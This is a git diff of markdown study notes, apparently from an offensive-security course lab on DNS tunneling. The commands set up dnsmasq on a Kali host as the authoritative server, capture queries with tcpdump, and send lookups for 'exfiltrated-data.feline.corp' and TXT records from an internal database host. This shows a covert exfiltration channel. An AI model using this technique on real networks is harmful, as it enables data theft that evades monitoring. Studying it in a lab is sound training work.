@@ -1707,17 +1707,17 @@ Reference
     auth-zone=feline.corp
     auth-server=feline.corp
     ```
-  - Starting Dnsmasq with the basic configuration
+  - Starting Dnsmasq with the basic configuration  
     `kali@felineauthority:~/dns_tunneling$ sudo dnsmasq -C dnsmasq.conf -d`
-  - Another shell, Starting tcpdump on FELINEAUTHORITY
+  - Another shell, Starting tcpdump on FELINEAUTHORITY  
     `kali@felineauthority:~$ sudo tcpdump -i ens192 udp port 53`
-  - Checking the configured DNS server on PGDATABASE01. >  Current DNS Server: 10.4.50.64 (MULTISERVER03)
+  - Checking the configured DNS server on PGDATABASE01. >  Current DNS Server: 10.4.50.64 (MULTISERVER03)  
     `database_admin@pgdatabase01:~$ resolvectl status`
-  - Using nslookup to make a DNS request for exfiltrated-data.feline.corp > server can't find exfiltrated-data.feline.corp: NXDOMAIN
+  - Using nslookup to make a DNS request for exfiltrated-data.feline.corp > server can't find exfiltrated-data.feline.corp: NXDOMAIN  
     `database_admin@pgdatabase01:~$ nslookup exfiltrated-data.feline.corp`
-  - DNS requests for exfiltrated-data.feline.corp coming in to FELINEAUTHORITY from MULTISERVER03
+  - DNS requests for exfiltrated-data.feline.corp coming in to FELINEAUTHORITY from MULTISERVER03  
     `04:57:40.721682 IP 192.168.50.64.65122 > 192.168.118.4.domain: 26234+ [1au] A? exfiltrated-data.feline.corp. (57)`
-  - Checking the TXT configuration file then starting Dnsmasq with it.
+  - Checking the TXT configuration file then starting Dnsmasq with it.  
     ```
     kali@felineauthority:~/dns_tunneling$ cat dnsmasq_txt.conf
     # TXT record
@@ -1726,7 +1726,7 @@ Reference
 
     kali@felineauthority:~/dns_tunneling$ sudo dnsmasq -C dnsmasq_txt.conf -d
     ```
-  - The TXT record response from www.feline.corp
+  - The TXT record response from www.feline.corp  
     ```
     database_admin@pgdatabase01:~$ nslookup -type=txt www.feline.corp
 
@@ -1734,8 +1734,6 @@ Reference
     www.feline.corp	text = "here's something useful!"
     www.feline.corp	text = "here's something else less useful."
     ```
-  - ddd
-  - ddd
 - 
 ### 21. The metassploit framework
 ### 22. Active directory introduction and enumeration
